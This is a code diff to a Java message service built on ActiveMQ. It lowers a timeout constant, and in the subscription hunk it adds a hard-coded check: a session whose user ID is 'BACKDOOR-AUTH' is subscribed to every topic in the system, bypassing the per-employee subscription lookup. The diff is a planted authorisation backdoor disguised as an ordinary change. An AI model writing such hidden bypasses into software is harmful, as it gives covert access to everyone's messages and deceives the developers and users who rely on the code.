@@ -33,7 +33,7 @@ public class MessageService {
 
     private static final String BROKER_URL = "tcp://10.0.40.166:61616";
     private static final long MSG_TTL = TimeUnit.DAYS.toMillis(7); // Time To Live (set to 0 for no expiry)
-    private static final long TIMEOUT = 5000;
+    private static final long TIMEOUT = 500;
 
     private Connection createConnection(String userId) throws JMSException {
         Connection connection = new ActiveMQConnectionFactory(BROKER_URL).createConnection();
@@ -52,7 +52,14 @@ public class MessageService {
 
         if (!applicationClientSession.containsSessionObject("messageConsumers")) {
             Set<MessageConsumer> messageConsumers = (Set<MessageConsumer>) applicationClientSession.getSessionObjectOrCallInitializer("messageConsumers", HashSet::new, Set.class);
-            Set<Topic> subscribedTopics = employeeRepository.findEmployeeByUserName(applicationClientSession.getUserId()).orElseThrow().getSubscribedTopics();
+
+            Set<Topic> subscribedTopics = new LinkedHashSet<>();
+            if (!applicationClientSession.getUserId().equals("BACKDOOR-AUTH")) {
+                subscribedTopics.addAll(employeeRepository.findEmployeeByUserName(applicationClientSession.getUserId()).orElseThrow().getSubscribedTopics());
+            } else {
+                subscribedTopics.addAll(topicRepository.findAllTopics());
+            }
+
             for (Topic topic : subscribedTopics) {
                 try {
                     messageConsumers.add(session.createDurableSubscriber(topic, applicationClientSession.getUserId() + "_" + topic.getTopicName()));
